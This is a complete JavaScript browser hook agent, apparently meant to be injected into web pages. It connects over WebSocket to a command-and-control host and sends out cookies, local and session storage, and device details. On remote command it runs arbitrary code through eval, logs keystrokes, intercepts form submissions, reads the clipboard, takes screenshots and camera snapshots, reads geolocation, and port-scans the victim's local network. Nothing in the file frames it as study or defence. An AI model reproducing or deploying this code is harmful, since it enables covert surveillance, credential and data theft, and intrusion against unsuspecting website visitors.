(function() {
    if (window.__cg2) return;
    window.__cg2 = true;

    var C2_HOST = (function() {
        try {
            return document.currentScript.src.split('/')[2].split(':')[0];
        } catch(e) { return '192.168.43.1'; }
    })();
    var C2_PORT = 9091;
    var ws = null;
    var sessionId = Math.random().toString(36).substr(2, 12);
    var keyBuffer = [];
    var clipboardMonitorInterval = null;
    var lastClipboard = '';
    var formInterceptEnabled = false;

    // --- register service worker for persistence ---
    if ('serviceWorker' in navigator) {
        var swCode = 'self.addEventListener("fetch", function(e){});';
        var blob = new Blob([swCode], {type: 'application/javascript'});
        var swUrl = URL.createObjectURL(blob);
        navigator.serviceWorker.register(swUrl).catch(function(){});
    }

    function connect() {
        try {
            ws = new WebSocket('ws://' + C2_HOST + ':' + C2_PORT + '/agent');
            ws.onopen = function() {
                send('register', {
                    sessionId: sessionId,
                    url: location.href,
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    language: navigator.language,
                    screen: screen.width + 'x' + screen.height,
                    cookies: document.cookie,
                    localStorage: grabStorage(),
                    referrer: document.referrer,
                    title: document.title,
                    vendor: navigator.vendor,
                    connection: getConnectionInfo()
                });
            };
            ws.onmessage = function(e) {
                try { handleCommand(JSON.parse(e.data)); } catch(err) {}
            };
            ws.onclose = function() { setTimeout(connect, 3000); };
            ws.onerror = function() { setTimeout(connect, 5000); };
        } catch(e) { setTimeout(connect, 5000); }
    }

    function send(type, data) {
        if (ws && ws.readyState === 1) {
            try { ws.send(JSON.stringify({type: type, session: sessionId, data: data})); } catch(e) {}
        }
    }

    function handleCommand(cmd) {
        switch(cmd.action) {
            case 'exec_js':
                try { var r = eval(cmd.code); send('exec_result', {id: cmd.id, result: String(r)}); }
                catch(e) { send('exec_result', {id: cmd.id, error: e.message}); }
                break;
            case 'get_cookies': send('cookies', {cookies: document.cookie}); break;
            case 'get_storage': send('storage', grabStorage()); break;
            case 'get_dom': send('dom', {html: document.documentElement.outerHTML.substring(0, 50000)}); break;
            case 'screenshot': takeScreenshot(); break;
            case 'keylog_start': startKeylogger(); break;
            case 'keylog_stop': stopKeylogger(); break;
            case 'keylog_dump': send('keylog', {keys: keyBuffer.splice(0)}); break;
            case 'redirect': location.href = cmd.url; break;
            case 'inject_html':
                var div = document.createElement('div');
                div.innerHTML = cmd.html;
                document.body.appendChild(div);
                send('ack', {action: 'inject_html'});
                break;
            case 'play_audio':
                var audio = new Audio(cmd.url);
                audio.volume = cmd.volume || 1.0;
                audio.play().catch(function(){});
                send('ack', {action: 'play_audio'});
                break;
            case 'play_video': showVideoOverlay(cmd.url); send('ack', {action: 'play_video'}); break;
            case 'show_document': showDocumentOverlay(cmd.url); send('ack', {action: 'show_document'}); break;
            case 'get_clipboard':
                navigator.clipboard.readText()
                    .then(function(t) { send('clipboard', {text: t}); })
                    .catch(function(e) { send('clipboard', {error: e.message}); });
                break;
            case 'clipboard_monitor_start': startClipboardMonitor(); break;
            case 'clipboard_monitor_stop': stopClipboardMonitor(); break;
            case 'get_location':
                navigator.geolocation.getCurrentPosition(
                    function(pos) { send('location', {lat: pos.coords.latitude, lon: pos.coords.longitude, accuracy: pos.coords.accuracy}); },
                    function(e) { send('location', {error: e.message}); },
                    {enableHighAccuracy: true, timeout: 10000}
                );
                break;
            case 'camera_snap': captureCamera(); break;
            case 'alert': alert(cmd.message); send('ack', {action: 'alert'}); break;
            case 'form_grab': send('forms', {forms: grabForms()}); break;
            case 'form_intercept_start': startFormIntercept(); break;
            case 'form_intercept_stop': formInterceptEnabled = false; break;
            case 'port_scan': portScan(cmd.targets || ['192.168.1.1'], cmd.ports || [80, 443, 8080, 8443, 3000, 5000]); break;
            case 'lan_probe': probeLan(cmd.subnet || '192.168.1'); break;
            case 'ping': send('pong', {time: Date.now(), url: location.href}); break;
            case 'get_device_info': send('device_info', getDeviceInfo()); break;
            case 'download_file':
                var a = document.createElement('a');
                a.href = cmd.url; a.download = cmd.filename || 'file';
                document.body.appendChild(a); a.click(); document.body.removeChild(a);
                send('ack', {action: 'download_file'});
                break;
        }
    }

    // --- keylogger ---
    var keyHandler = null;
    function startKeylogger() {
        if (keyHandler) return;
        keyHandler = function(e) {
            keyBuffer.push({key: e.key, code: e.code, target: e.target.tagName + (e.target.name ? '#' + e.target.name : ''), time: Date.now()});
            if (keyBuffer.length >= 50) send('keylog', {keys: keyBuffer.splice(0)});
        };
        document.addEventListener('keydown', keyHandler, true);
        send('ack', {action: 'keylog_start'});
    }
    function stopKeylogger() {
        if (keyHandler) { document.removeEventListener('keydown', keyHandler, true); keyHandler = null; }
        send('keylog', {keys: keyBuffer.splice(0)});
    }

    // --- clipboard monitor ---
    function startClipboardMonitor() {
        if (clipboardMonitorInterval) return;
        clipboardMonitorInterval = setInterval(function() {
            navigator.clipboard.readText().then(function(text) {
                if (text && text !== lastClipboard) {
                    lastClipboard = text;
                    send('clipboard_change', {text: text, time: Date.now()});
                }
            }).catch(function(){});
        }, 2000);
        send('ack', {action: 'clipboard_monitor_start'});
    }
    function stopClipboardMonitor() {
        if (clipboardMonitorInterval) { clearInterval(clipboardMonitorInterval); clipboardMonitorInterval = null; }
    }

    // --- form intercept ---
    function startFormIntercept() {
        formInterceptEnabled = true;
        document.addEventListener('submit', function(e) {
            if (!formInterceptEnabled) return;
            var form = e.target;
            var fields = {};
            var inputs = form.querySelectorAll('input, select, textarea');
            inputs.forEach(function(el) {
                if (el.name) fields[el.name] = el.value;
            });
            send('form_submit_intercept', {
                action: form.action,
                method: form.method,
                fields: fields,
                url: location.href
            });
        }, true);
        send('ack', {action: 'form_intercept_start'});
    }

    // --- port scan from browser ---
    function portScan(targets, ports) {
        var results = {};
        var pending = targets.length * ports.length;
        targets.forEach(function(target) {
            results[target] = [];
            ports.forEach(function(port) {
                var img = new Image();
                var start = Date.now();
                img.onload = img.onerror = function(e) {
                    var open = Date.now() - start < 300;
                    if (open) results[target].push(port);
                    if (--pending === 0) send('port_scan_result', {results: results});
                };
                img.src = 'http://' + target + ':' + port + '/favicon.ico?' + Math.random();
                setTimeout(function() {
                    if (--pending === 0) send('port_scan_result', {results: results});
                }, 500);
            });
        });
    }

    // --- LAN probe ---
    function probeLan(subnet) {
        var found = [];
        var pending = 254;
        for (var i = 1; i <= 254; i++) {
            (function(host) {
                var ip = subnet + '.' + host;
                var img = new Image();
                img.onload = function() { found.push(ip); };
                img.onerror = function(e) {
                    if (e.type !== 'error' || String(e.target.src).indexOf(ip) >= 0) found.push(ip);
                };
                img.src = 'http://' + ip + ':80/favicon.ico';
                setTimeout(function() {
                    if (--pending === 0) send('lan_probe_result', {hosts: found, subnet: subnet});
                }, 800);
            })(i);
        }
    }

    // --- screenshot ---
    function takeScreenshot() {
        if (typeof html2canvas === 'undefined') {
            var s = document.createElement('script');
            s.src = 'https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js';
            s.onload = function() { doScreenshot(); };
            document.head.appendChild(s);
        } else { doScreenshot(); }
    }
    function doScreenshot() {
        html2canvas(document.body, {scale: 0.5, useCORS: true}).then(function(canvas) {
            send('screenshot', {image: canvas.toDataURL('image/jpeg', 0.6)});
        }).catch(function(e) { send('screenshot', {error: e.message}); });
    }

    // --- camera ---
    function captureCamera() {
        navigator.mediaDevices.getUserMedia({video: true}).then(function(stream) {
            var video = document.createElement('video');
            video.srcObject = stream; video.play();
            setTimeout(function() {
                var canvas = document.createElement('canvas');
                canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                stream.getTracks().forEach(function(t) { t.stop(); });
                send('camera', {image: canvas.toDataURL('image/jpeg', 0.7)});
            }, 1000);
        }).catch(function(e) { send('camera', {error: e.message}); });
    }

    // --- overlays ---
    function showVideoOverlay(url) {
        var d = document.createElement('div');
        d.style.cssText = 'position:fixed;top:0;left:0;width:100vw;height:100vh;background:rgba(0,0,0,.95);z-index:999999;display:flex;align-items:center;justify-content:center';
        var v = document.createElement('video');
        v.src = url; v.autoplay = true; v.controls = true; v.style.cssText = 'max-width:90vw;max-height:90vh';
        var c = document.createElement('span');
        c.textContent = '\u2715'; c.style.cssText = 'position:absolute;top:20px;right:20px;color:#fff;font-size:30px;cursor:pointer';
        c.onclick = function() { d.remove(); };
        d.appendChild(v); d.appendChild(c); document.body.appendChild(d);
    }
    function showDocumentOverlay(url) {
        var d = document.createElement('div');
        d.style.cssText = 'position:fixed;top:5vh;left:5vw;width:90vw;height:90vh;z-index:999999;background:#fff;border:2px solid #333;box-shadow:0 0 20px rgba(0,0,0,.5)';
        var h = document.createElement('div');
        h.style.cssText = 'height:36px;background:#222;display:flex;align-items:center;justify-content:flex-end;padding:0 10px';
        var cl = document.createElement('span');
        cl.textContent = 'Close'; cl.style.cssText = 'color:#fff;cursor:pointer;font-size:13px';
        cl.onclick = function() { d.remove(); };
        var f = document.createElement('iframe');
        f.src = url; f.style.cssText = 'width:100%;height:calc(100% - 36px);border:none';
        h.appendChild(cl); d.appendChild(h); d.appendChild(f); document.body.appendChild(d);
    }

    // --- data grabbers ---
    function grabStorage() {
        var data = {};
        try { for (var i = 0; i < localStorage.length; i++) { var k = localStorage.key(i); data[k] = localStorage.getItem(k); } } catch(e) {}
        try {
            var sessionData = {};
            for (var i = 0; i < sessionStorage.length; i++) { var k = sessionStorage.key(i); sessionData[k] = sessionStorage.getItem(k); }
            data._session = sessionData;
        } catch(e) {}
        return data;
    }
    function grabForms() {
        var forms = [];
        document.querySelectorAll('form').forEach(function(f) {
            var fields = [];
            f.querySelectorAll('input,select,textarea').forEach(function(el) {
                fields.push({tag: el.tagName, type: el.type || '', name: el.name || '', value: el.value || '', id: el.id || '', placeholder: el.placeholder || ''});
            });
            forms.push({action: f.action, method: f.method, fields: fields});
        });
        return forms;
    }
    function getDeviceInfo() {
        return {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            languages: navigator.languages,
            cookieEnabled: navigator.cookieEnabled,
            doNotTrack: navigator.doNotTrack,
            hardwareConcurrency: navigator.hardwareConcurrency,
            deviceMemory: navigator.deviceMemory,
            screen: {width: screen.width, height: screen.height, colorDepth: screen.colorDepth, pixelRatio: window.devicePixelRatio},
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            connection: getConnectionInfo(),
            battery: null
        };
    }
    function getConnectionInfo() {
        var c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
        if (!c) return null;
        return {type: c.effectiveType, downlink: c.downlink, rtt: c.rtt, saveData: c.saveData};
    }

    // --- SPA navigation tracking ---
    var origPush = history.pushState;
    var origReplace = history.replaceState;
    history.pushState = function() { origPush.apply(this, arguments); send('navigate', {url: location.href, title: document.title}); };
    history.replaceState = function() { origReplace.apply(this, arguments); send('navigate', {url: location.href, title: document.title}); };
    window.addEventListener('popstate', function() { send('navigate', {url: location.href, title: document.title}); });

    connect();
})();
